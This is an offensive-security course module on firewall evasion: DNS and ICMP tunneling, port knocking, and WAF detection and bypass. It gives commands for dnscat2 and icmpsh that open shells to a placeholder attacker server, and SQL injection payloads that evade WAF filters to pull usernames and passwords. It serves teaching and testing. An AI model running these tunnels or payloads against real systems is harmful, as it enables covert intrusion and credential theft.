# Module 12 - Firewall Evasion: Tunneling, Port Knocking & WAF Bypass

## Why this is separate from Module 6, not a repeat
Module 6 covered evading detection **during an Nmap scan** — fragmentation, decoys, spoofing, all at the packet-crafting level. This module covers a different problem entirely: **getting actual traffic through or around a firewall's blocking rules**, after scanning is done and you need real, working communication (a shell, a data channel) despite restrictive outbound/inbound rules. Different goal, different techniques, deliberately no overlap.

---

## DNS Tunneling — smuggling data through a protocol firewalls rarely block

**Why this works as an evasion technique at all:** Almost every firewall configuration allows outbound DNS traffic (port 53) — blocking it would break basic internet functionality for every device on the network, since DNS resolution is required for essentially everything. This makes DNS one of the most reliably *open* outbound channels on almost any network, which is exactly why it gets abused.

**The core idea:** instead of using DNS for its normal purpose (resolving a name to an IP), data is encoded into DNS queries themselves — a compromised machine encodes stolen data or command output into a subdomain query sent to an attacker-controlled DNS server, which decodes it on arrival.

**Practical tool — `dnscat2`:**
```
# On the attacker's server:
ruby dnscat2.rb <attacker-domain>

# On the compromised target:
./dnscat --dns server=<attacker-ip>,port=53
```
This establishes a full command-and-control channel disguised entirely as ordinary DNS queries — to a firewall or basic monitoring tool, it looks like a device is just doing an unusually large number of DNS lookups, not carrying a full interactive session.

**Why this matters even in a heavily locked-down network:** many organizations restrict *which specific ports/protocols* can leave the network, but rarely restrict DNS itself, since doing so breaks normal operations — this makes DNS tunneling one of the most reliable exfiltration/C2 channels precisely because blocking it has a real operational cost the organization is unwilling to pay.

---

## ICMP Tunneling — smuggling data through ping packets

**Why this works, similarly to DNS:** ICMP (used by the `ping` command) is another protocol almost universally allowed outbound, since basic network troubleshooting depends on it.

**The core idea:** data is embedded into the payload portion of ICMP Echo Request/Reply packets — normal `ping` traffic has a small, mostly-ignored payload field; tunneling tools use that space to carry actual data back and forth.

**Practical tool — `icmpsh`:**
```
# On the attacker's machine (listener):
python icmpsh_m.py <attacker-ip> <target-ip>

# On the target:
icmpsh.exe -t <attacker-ip>
```
Establishes a basic shell over ICMP specifically — genuinely useful in environments where TCP/UDP outbound is tightly restricted, but basic ping connectivity was left open (often precisely because network admins use ping constantly themselves for troubleshooting, and are reluctant to block it).

---

## Port Knocking — the defensive technique, and how it's tested/bypassed

**What it actually is (this one is primarily defensive, worth understanding both directions):** A technique where a service (commonly SSH) is kept completely closed/invisible by default — a scan of that port shows nothing at all. Access is only granted after a specific, pre-arranged sequence of connection attempts to a series of *other*, seemingly unrelated closed ports is observed, in the exact right order — the "knock." Only after the correct sequence does the firewall dynamically open the real port for that source IP.

**Why this is genuinely effective as a defense:** a standard port scan of the protected service reveals nothing — the port isn't just access-controlled, it's not even visibly open at all until the correct knock sequence has occurred, denying a scanning attacker even the basic knowledge that a service exists there.

**How the legitimate client performs a knock (using `knockd`'s companion client):**
```
knock <server-ip> 7000 8000 9000
```
Sends connection attempts to ports 7000, 8000, then 9000 in that exact sequence — the server's `knockd` daemon is watching for precisely this pattern, and only then opens the real SSH port temporarily for the source IP that knocked correctly.

**Why this is hard, but not impossible, for an attacker to bypass:** if the correct knock sequence can be discovered (through misconfiguration, weak/predictable sequences, or if the sequence itself was ever sent over an unencrypted channel and captured via sniffing — connecting directly back to earlier sniffing content), it can simply be replayed. This is precisely why port knocking is considered a layer of **obscurity**, not true cryptographic security — a captured or guessed sequence defeats it entirely, the same underlying lesson as any security control that depends on a secret staying secret rather than on genuine cryptographic strength.

---

## WAF (Web Application Firewall) Detection and Bypass

**Why this is distinct from network-level firewalls:** everything covered so far in this module operates at the network/transport layer. A WAF operates at Layer 7, specifically inspecting HTTP traffic content for known attack *patterns* (SQLi syntax, XSS payloads) — a completely different inspection model requiring different evasion approaches.

**Detecting a WAF's presence first:**
```
wafw00f http://target-company.com
```
This tool sends a series of probe requests and analyzes the responses (specific headers, block-page wording, subtle behavioral differences) to identify not just *whether* a WAF is present, but often *which specific product* — knowing the exact WAF product matters because different WAFs have different, product-specific known bypass techniques.

**Common WAF bypass techniques, connecting directly back to the SQLi and XSS content in the web security series:**

**Case manipulation** — many simpler WAF rules are case-sensitive:
```
' UnIoN SeLeCT username, password FROM users--
```

**Inline comments to break up detected keywords:**
```
' UNI/**/ON SEL/**/ECT username, password FROM users--
```
Some WAF pattern-matching rules look for the literal contiguous string "UNION SELECT" — inserting a SQL comment in the middle keeps the query valid to the database (which ignores comments) while breaking the exact substring match the WAF's simpler rule was looking for.

**Encoding payloads:**
```
%55NION%20SELECT
```
URL-encoding specific characters can sometimes pass through a WAF rule that only checks the raw, unencoded string, while the web server itself still decodes and processes it correctly.

**Why this connects directly back to Module 6's `--data-length` and fragmentation concepts:** the underlying principle is identical across every evasion technique in this entire series — **find the gap between what the inspecting device is checking for, and what the actual receiving system is willing to accept and process.** A WAF checking for an exact string, a firewall checking for a specific packet size, an IDS checking for a specific signature — every bypass technique in this module and Module 6 is a variation on exploiting that exact same gap.

## Quick-reference table

| Technique | What it evades | Real tool |
|---|---|---|
| DNS Tunneling | Outbound port/protocol restrictions | `dnscat2` |
| ICMP Tunneling | Outbound port/protocol restrictions | `icmpsh` |
| Port Knocking | Reveals a service only exists after a correct sequence (defensive; bypassable if sequence leaks) | `knockd` / `knock` |
| WAF Bypass (case/comments/encoding) | Layer 7 pattern-matching on HTTP content | `wafw00f` for detection, manual payload crafting for bypass |

## The one idea tying this entire module together
Every technique here works because **the device doing the blocking and the device doing the actual processing don't interpret the exact same input identically** — a firewall that only inspects standard ports misses tunneled DNS/ICMP traffic; a WAF checking for an exact keyword misses an obfuscated variant the database still executes correctly. Firewall evasion, at its core, is never about breaking encryption or breaking authentication — it's about finding where two different systems disagree about what a given piece of traffic actually means.
